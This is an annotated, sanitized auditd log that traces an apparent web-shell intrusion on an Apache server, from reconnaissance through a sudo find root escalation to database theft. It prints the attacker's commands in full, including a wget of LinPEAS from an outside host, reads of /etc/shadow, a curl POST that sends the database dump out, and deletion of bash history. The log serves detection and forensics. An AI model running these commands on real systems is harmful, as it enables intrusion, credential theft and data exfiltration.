@@ -1,0 +1,170 @@
+# auditd Process Log — Sanitized
+# Host: WEB-SERVER-01 (Ubuntu 22.04)
+# Source: /var/log/audit/audit.log
+# Filtered: SYSCALL execve events from apache2 and its child processes
+# Window: 2024-05-21 14:28:00 UTC to 2024-05-21 14:55:00 UTC
+# Command used to extract:
+#   ausearch -m execve --start 05/21/2024 14:28:00 --end 05/21/2024 14:55:00 \
+#   | aureport --executable --summary
+# -----------------------------------------------------------------------
+
+
+# === SECTION 1: RAW AUDITD EXECVE EVENTS ===
+
+# --- Apache handling upload request (14:28:03) ---
+type=SYSCALL msg=audit(1716300483.112:4401): arch=c000003e syscall=59 success=yes exit=0 \
+  a0=5622f1a3b010 a1=5622f1a3b040 a2=5622f1a3b0a0 items=2 ppid=3301 pid=3388 \
+  auid=4294967295 uid=33 gid=33 euid=33 egid=33 \
+  exe="/usr/sbin/apache2" key="webshell_monitor"
+type=EXECVE msg=audit(1716300483.112:4401): argc=3 a0="/usr/sbin/apache2" a1="-k" a2="start"
+
+# --- Web shell first executed — apache2 spawns /bin/sh (14:32:07) ---
+type=SYSCALL msg=audit(1716300727.441:4488): arch=c000003e syscall=59 success=yes exit=0 \
+  a0=7f3b2c1a0010 a1=7f3b2c1a0040 a2=7f3b2c1a00a0 items=2 ppid=3388 pid=4201 \
+  auid=4294967295 uid=33 gid=33 euid=33 egid=33 \
+  exe="/bin/sh" key="webshell_monitor"
+type=EXECVE msg=audit(1716300727.441:4488): argc=3 a0="/bin/sh" a1="-c" a2="whoami"
+# ⚠️ apache2 directly spawning /bin/sh — web shell executing OS command
+
+type=SYSCALL msg=audit(1716300727.448:4489): arch=c000003e syscall=59 success=yes exit=0 \
+  a0=7f3b2c1a1010 a1=7f3b2c1a1040 items=2 ppid=4201 pid=4202 \
+  auid=4294967295 uid=33 gid=33 euid=33 egid=33 \
+  exe="/usr/bin/whoami" key="webshell_monitor"
+type=EXECVE msg=audit(1716300727.448:4489): argc=1 a0="whoami"
+# Output: www-data
+
+# --- id command (14:32:19) ---
+type=SYSCALL msg=audit(1716300739.214:4491): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=3388 pid=4211 uid=33 gid=33 euid=33 egid=33 \
+  exe="/bin/sh" key="webshell_monitor"
+type=EXECVE msg=audit(1716300739.214:4491): argc=3 a0="/bin/sh" a1="-c" a2="id"
+
+type=SYSCALL msg=audit(1716300739.219:4492): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=4211 pid=4212 uid=33 gid=33 euid=33 egid=33 \
+  exe="/usr/bin/id" key="webshell_monitor"
+type=EXECVE msg=audit(1716300739.219:4492): argc=1 a0="id"
+
+# --- cat /etc/passwd (14:34:11) ---
+type=SYSCALL msg=audit(1716300851.882:4511): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=3388 pid=4241 uid=33 gid=33 euid=33 egid=33 \
+  exe="/bin/sh" key="webshell_monitor"
+type=EXECVE msg=audit(1716300851.882:4511): argc=3 a0="/bin/sh" a1="-c" a2="cat /etc/passwd"
+# ⚠️ Sensitive file read
+
+# --- SUID search (14:35:47) ---
+type=SYSCALL msg=audit(1716300947.331:4528): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=3388 pid=4263 uid=33 gid=33 euid=33 egid=33 \
+  exe="/bin/sh" key="webshell_monitor"
+type=EXECVE msg=audit(1716300947.331:4528): argc=6 \
+  a0="/bin/sh" a1="-c" a2="find" a3="/" a4="-perm" a5="-u=s -type f 2>/dev/null"
+# ⚠️ Privilege escalation enumeration — hunting for SUID binaries
+
+# --- wget to download LinPEAS (14:38:02) ---
+type=SYSCALL msg=audit(1716301082.119:4544): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=3388 pid=4289 uid=33 gid=33 euid=33 egid=33 \
+  exe="/bin/sh" key="webshell_monitor"
+type=EXECVE msg=audit(1716301082.119:4544): argc=5 \
+  a0="/bin/sh" a1="-c" a2="wget" a3="http://203.0.113.88:9090/linpeas.sh" a4="-O /tmp/.cache/lp.sh"
+# ⚠️ Outbound file download from attacker C2
+
+# --- LinPEAS execution (14:38:19) ---
+type=SYSCALL msg=audit(1716301099.774:4551): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=3388 pid=4301 uid=33 gid=33 euid=33 egid=33 \
+  exe="/bin/bash" key="webshell_monitor"
+type=EXECVE msg=audit(1716301099.774:4551): argc=3 \
+  a0="/bin/bash" a1="/tmp/.cache/lp.sh"
+# ⚠️ LinPEAS privilege escalation script running as www-data
+
+# --- sudo find GTFOBins exploit (14:43:07) ---
+type=SYSCALL msg=audit(1716301387.002:4601): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=3388 pid=4401 uid=33 gid=33 euid=0 egid=0 \
+  exe="/usr/bin/sudo" key="webshell_monitor"
+type=EXECVE msg=audit(1716301387.002:4601): argc=5 \
+  a0="sudo" a1="find" a2="." a3="-exec" a4="/bin/bash \; -quit"
+# ⚠️ euid=0 egid=0 — sudo granted root effective UID to www-data (uid=33)
+# ⚠️ GTFOBins: find -exec /bin/bash spawns root shell
+
+type=SYSCALL msg=audit(1716301387.009:4602): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=4401 pid=4402 uid=0 gid=0 euid=0 egid=0 \
+  exe="/bin/bash" key="webshell_monitor"
+type=EXECVE msg=audit(1716301387.009:4602): argc=1 a0="/bin/bash"
+# ⚠️ ROOT SHELL — uid=0, euid=0. Attacker now has full root access.
+
+# --- Root reads /etc/shadow (14:43:15) ---
+type=SYSCALL msg=audit(1716301395.441:4604): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=4402 pid=4408 uid=0 gid=0 euid=0 egid=0 \
+  exe="/bin/cat" key="webshell_monitor"
+type=EXECVE msg=audit(1716301395.441:4604): argc=2 a0="cat" a1="/etc/shadow"
+# ⚠️ Password hashes accessed
+
+# --- Database dump (14:45:18) ---
+type=SYSCALL msg=audit(1716301518.882:4621): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=4402 pid=4441 uid=0 gid=0 euid=0 egid=0 \
+  exe="/usr/bin/mysqldump" key="webshell_monitor"
+type=EXECVE msg=audit(1716301518.882:4621): argc=5 \
+  a0="mysqldump" a1="-u" a2="webappuser" a3="-p[REDACTED]" a4="webapp_db"
+# ⚠️ Full database dump — output redirected to /tmp/.cache/db.sql
+
+# --- Database exfiltration (14:46:03) ---
+type=SYSCALL msg=audit(1716301563.114:4631): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=4402 pid=4458 uid=0 gid=0 euid=0 egid=0 \
+  exe="/usr/bin/curl" key="webshell_monitor"
+type=EXECVE msg=audit(1716301563.114:4631): argc=6 \
+  a0="curl" a1="-X" a2="POST" a3="-F" a4="file=@/tmp/.cache/db.sql" a5="http://203.0.113.88:9090/upload"
+# ⚠️ EXFILTRATION — database sent to attacker C2 over HTTP
+
+# --- History cleared (14:48:55) ---
+type=SYSCALL msg=audit(1716301735.009:4668): arch=c000003e syscall=59 success=yes exit=0 \
+  ppid=4402 pid=4491 uid=0 gid=0 euid=0 egid=0 \
+  exe="/bin/rm" key="webshell_monitor"
+type=EXECVE msg=audit(1716301735.009:4668): argc=2 a0="rm" a1="/root/.bash_history"
+# Anti-forensics — bash history deleted
+
+
+# === SECTION 2: PROCESS TREE SUMMARY (Visual) ===
+#
+#  apache2  [PID 3301, uid=33 www-data]
+#  └── apache2 worker [PID 3388, uid=33]          ← handles web requests
+#      │
+#      ├── /bin/sh -c "whoami"        [PID 4201]  ← web shell cmd execution
+#      ├── /bin/sh -c "id"            [PID 4211]
+#      ├── /bin/sh -c "cat /etc/passwd" [PID 4241]
+#      ├── /bin/sh -c "find / -perm -u=s" [PID 4263]   ← privesc recon
+#      ├── /bin/sh -c "wget .../linpeas.sh" [PID 4289]  ← C2 download
+#      ├── /bin/bash /tmp/.cache/lp.sh  [PID 4301]     ← LinPEAS
+#      │
+#      └── sudo find . -exec /bin/bash  [PID 4401, euid=0]  ← PRIVESC
+#          └── /bin/bash  [PID 4402, uid=0 ROOT]  ⚠️ ROOT SHELL
+#              ├── cat /etc/shadow       [PID 4408]
+#              ├── cat /var/www/html/config.php  [PID 4419]
+#              ├── mysql ...             [PID 4431]
+#              ├── mysqldump ...         [PID 4441]  ← DB dump
+#              ├── curl ... db.sql       [PID 4458]  ← EXFIL
+#              ├── crontab -e            [PID 4471]  ← PERSISTENCE
+#              └── rm /root/.bash_history [PID 4491] ← ANTI-FORENSICS 
+
+
+# === SECTION 3: PROCESS STATISTICS ===
+
+Metric                                   Value
+---------------------------------------  ----------------------------------
+apache2 child /bin/sh executions         9   (web shell commands)
+Processes with uid=33 (www-data)         11
+Processes with uid=0 (root)              8   ← post-privesc
+sudo execve calls from www-data          4   (3 denied, 1 allowed)
+External network connections initiated   2   (wget + curl)
+Files read with sensitive content        3   (/etc/passwd, /etc/shadow, config.php)
+Database operations                      2   (mysql login + mysqldump)
+Cron modifications                       1
+Anti-forensic actions                    1   (history -c + rm .bash_history)
+
+
+# -----------------------------------------------------------------------
+# ANALYST NOTES:
+# - apache2 spawning /bin/sh is the primary detection indicator
+# - uid=33 (www-data) transitioning to uid=0 (root) confirms privesc success
+# - euid=0 on the sudo find call shows effective root before bash spawned
+# - auditd key "webshell_monitor" would need to be pre-configured in audit.rules:
+#     -a always,exit -F arch=b64 -S execve -F uid=33 -k webshell_monitor
+# - Recommend adding this rule to /etc/audit/rules.d/webshell.rules
+# -----------------------------------------------------------------------
